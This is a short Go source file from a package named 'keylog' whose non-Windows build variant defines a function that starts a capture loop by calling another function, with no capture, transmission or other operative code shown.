//go:build !windows

package keylog

import (
	"context"
	"log/slog"
)

func spawnCaptureInUserSession(ctx context.Context, id string, pub publisher, log *slog.Logger) {
	captureLoop(ctx, id, pub, log)
}
